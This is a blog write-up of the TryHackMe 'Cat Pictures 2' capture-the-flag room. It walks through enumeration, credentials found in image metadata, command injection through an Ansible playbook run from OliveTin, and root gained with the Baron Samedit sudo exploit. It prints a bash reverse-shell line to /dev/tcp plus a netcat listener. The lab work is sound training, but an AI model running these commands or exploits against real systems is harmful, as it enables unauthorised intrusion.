---
title: "Cat Pictures 2 | TryHackMe"
collection: publications
permalink: /publication/cat-pictures-2
excerpt: 'This is a free room from TryHackMe'
date: 2023-07-07
venue: '07-07'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/catpictures2.png)

**LINK :** [Cat Pictures 2](https://tryhackme.com/room/catpictures2)



# Enumeration

* Started by running an Nmap scan :

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 07:21 EDT
Nmap scan report for 10.10.130.123
Host is up (0.064s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
1337/tcp open  http    OliveTin
3000/tcp open  ppp?
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
```

The scan reveals 6 open ports :

 * ``ssh`` running on port 22.
 * ``nginx`` on port 80.
 * ``ssh`` on port 222.
 * ``OliveTin`` on port 1337 to access predefined shell commands from a a web interface.
 * ``Gitea`` on port 3000.
 * ``nginx`` default page on port 8080.


---

* On port 80 we have a ``Lychee`` photo album with cat pictures, and since this room is about cats, it must be our way to get the first flag.
* I downloaded all the cats pictures and run ``exiftool`` to read the metadata of these pictures.

```bash
exiftool *.jpg
```
![catpictures1](/images/cat_pictures1.png)

* I noticed that one of these pictures revealed the path to a text file on port ``8080``.

* Checking the text file, we found the credentials to access ``gitea``.

![catpictures2](/images/cat_pictures2.png)

# FLAG 1 :

* After gaining the access to the user's account we found, you will see a file named ``flag1.txt`` in ``ansible`` repository.

![catpictures3](/images/cat_pictures3.png)

# FLAG 2 :

* Checking the Ansible playbook, you will notice it contains a ``command`` line. so the idea here is to change the command and run the playbook from the ``OliveTin`` page on port ``1337`` to see if the command is getting executed.

> [Ansible playbooks](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_intro.html)

![catpictures4](/images/cat_pictures4.png)

![catpictures5](/images/cat_pictures5.png)

![catpictures6](/images/cat_pictures6.png)

* Since the command is getting executed, we can run a reverse shell to us.

```bash
bash -c "bash -i >& /dev/tcp/<your-ip-address>/4444 0>&1"
```
![catpictures7](/images/cat_pictures7.png)

* Before you run the ansible playbook, let's open a netcat listener

```bash
nc -lvnp 4444
```
![catpictures8](/images/cat_pictures8.png)

# FLAG 3 :

* In order to speed things up, let's run ``linpeas`` to see if we have a privilege escalation vector.

> [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

* The one that stood out is ``the sudo Baron Samedit``.

![catpictures9](/images/cat_pictures9.png)

* I downloaded this [exploit](https://github.com/blasty/CVE-2021-3156) and uploaded it to the target machine.

```bash
make
```
![catpictures10](/images/cat_pictures10.png)

* let's run ``sudo-hax-me-a-sandwic``

```bash
.\sudo-hax-me-a-sandwic 0
```
![catpictures11](/images/cat_pictures11.png)

* Now we are root, change directory to ``/root`` and get your 3rd flag.




